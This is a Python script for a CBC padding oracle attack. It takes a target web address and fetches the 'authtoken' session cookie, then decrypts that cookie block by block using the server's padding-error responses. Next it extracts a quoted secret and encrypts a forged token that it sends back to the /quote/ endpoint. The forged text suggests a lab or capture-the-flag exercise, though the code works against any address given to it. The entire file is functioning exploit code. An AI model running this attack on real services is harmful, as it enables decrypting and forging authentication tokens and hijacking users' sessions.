# CBC Padding Oracle Attack
# __Mehedi 

import requests
import sys
import re
from Crypto.Util.Padding import pad
import os

class Colors:
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    RED = '\033[91m'
    ENDC = '\033[0m'

class PaddingOracleAttack:
    def __init__(self, block_size=16):
        self.BLOCK_SIZE = block_size

    def print_banner(self, address):
        total_width = 39  
        address_line = f"║  Target: {address}"
        padding = " " * (total_width - len(address_line))
        banner = f"""
        ╔═══════════════════════════════════════╗
        ║     CBC Padding Oracle Attack         ║
        ║        By Md.Mehedi Faruk 	        ║
        {address_line}{padding}║
        ╚═══════════════════════════════════════╝
        """
        print(banner)

    def requesting_for_token(self, address):
        res = requests.get(address)
        return res.cookies.get_dict().get("authtoken")

    def sending_token(self, token, address):
        res = requests.get(f"{address}/quote/", cookies={"authtoken": token.hex()})
        print(f"{Colors.BLUE}res.text:{Colors.ENDC}\n{res.text}")
        return res.text.split('\n')[1]

    def sending_short_token(self, token, address):
        return requests.get(f"{address}/quote/", cookies={"authtoken": token.hex()})

    def xor_block(self, iv, dec):
        assert len(iv) == len(dec)
        reply_from_server = b""
        for i in range(len(iv)):
            reply_from_server += bytes([iv[i] ^ dec[i]])
        return reply_from_server

    def oracle_for_attack(self, iv, block, address):
        new_ciphertext = iv + block
        res = self.sending_short_token(new_ciphertext, address)
        return (res.text != "Padding is incorrect.") and (
            res.text != "PKCS#7 padding is incorrect."
        )

    def single_block(self, block, address):
        print("\nDecrypting block: ", end="")
        iv_zero = [0] * self.BLOCK_SIZE
        for valid_pad in range(1, self.BLOCK_SIZE + 1):
            print("█", end="", flush=True)
            iv_pad = []
            for b in iv_zero:
                iv_pad.append(valid_pad ^ b)
            for element_cand in range(256):
                iv_pad[-valid_pad] = element_cand
                iv = bytes(iv_pad)
                if self.oracle_for_attack(iv, block, address):
                    if valid_pad == 1:
                        iv_pad[-2] ^= 1
                        iv = bytes(iv_pad)
                        if not self.oracle_for_attack(iv, block, address):
                            continue
                    break
            else:
                raise Exception("No valid padding byte found")
            iv_zero[-valid_pad] = element_cand ^ valid_pad
        return bytes(iv_zero)

    def all_block(self, iv, ct, address):
        message_iv_ct = iv + ct
        blocks = []
        for i in range(0, len(message_iv_ct), self.BLOCK_SIZE):
            blocks.append(message_iv_ct[i : i + self.BLOCK_SIZE])
        reply_from_server = b""
        iv_zero_block = []
        iv = blocks[0]
        for ct in blocks[1:]:
            zeroing_iv_block = self.single_block(ct, address)
            iv_zero_block.append(zeroing_iv_block)
            block_plaintext = self.xor_block(iv, zeroing_iv_block)
            reply_from_server += block_plaintext
            print(f"{Colors.GREEN}reply_from_server:{Colors.ENDC} {reply_from_server.decode('latin1')}")
            iv = ct
        return reply_from_server, iv_zero_block

    def encryption_cbc(self, plaintext, address):
        if isinstance(plaintext, str):
            plaintext = plaintext.encode("utf-8")
        if len(plaintext) % self.BLOCK_SIZE != 0:
            raise ValueError(f"Data must be padded to {self.BLOCK_SIZE} byte boundary in CBC mode")

        plaintext_blocks = [plaintext[i:i + self.BLOCK_SIZE] 
                        for i in range(0, len(plaintext), self.BLOCK_SIZE)]
        N = len(plaintext_blocks)
        Cn_1 = bytearray(os.urandom(self.BLOCK_SIZE))
        ciphertext_blocks = [Cn_1]
        iv_zero_block = []
        for i in range(N - 1, 0, -1):
            zeroing_iv_block = self.single_block(bytes(ciphertext_blocks[0]), address)
            iv_zero_block.append(zeroing_iv_block)
            Ci_1 = self.xor_block(plaintext_blocks[i], zeroing_iv_block)
            ciphertext_blocks.insert(0, Ci_1)
        zeroing_iv_block = self.single_block(bytes(ciphertext_blocks[0]), address)
        iv_zero_block.append(zeroing_iv_block)
        IV = self.xor_block(plaintext_blocks[0], zeroing_iv_block)
        ciphertext = b"".join(ciphertext_blocks)
        
        return IV, ciphertext

    def iv_ct_tobyte(self, token, blocksize):
        iv = token[:blocksize]
        ciphertext = token[blocksize:]
        assert len(iv) == blocksize and len(ciphertext) % blocksize == 0
        iv_bytes = bytes.fromhex(iv)
        ciphertext_bytes = bytes.fromhex(ciphertext)
        return (iv_bytes, ciphertext_bytes)

    def getting_quotes(self, string_with_quotes):
        pattern = r'"(.*?)"'
        matches = re.findall(pattern, string_with_quotes)
        return matches

    def run_attack(self, address):
        self.print_banner(address)

        token_req = self.requesting_for_token(address)
        print(f"{Colors.GREEN}[+] token_req:{Colors.ENDC} {token_req}")

        iv, ciphertext = self.iv_ct_tobyte(token_req, self.BLOCK_SIZE)
        res, iv_zero_block = self.all_block(iv, ciphertext, address)
        print(f"res: {res}")
        arr_to_utf8 = res.decode('latin1')
        print(arr_to_utf8)

        secret = self.getting_quotes(arr_to_utf8)
        print(f"{Colors.BLUE}secret:{Colors.ENDC} {secret}")
        text_to_send = secret[0] + " plain CBC is not secure!"
        print(f"{Colors.BLUE}text_to_send:{Colors.ENDC} {text_to_send}")

        padded_text_to_send = pad(text_to_send.encode(), self.BLOCK_SIZE)
        iv_send, ct_send = self.encryption_cbc(padded_text_to_send, address)
        bytes_to_send = iv_send + ct_send

        readable_output = self.sending_token(bytes_to_send, address)
        print(f"{Colors.GREEN}readable_output:{Colors.ENDC} {readable_output}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"usage: {sys.argv[0]} <address>", file=sys.stderr)
        exit(1)
    
    attack = PaddingOracleAttack()
    attack.run_attack(sys.argv[1])
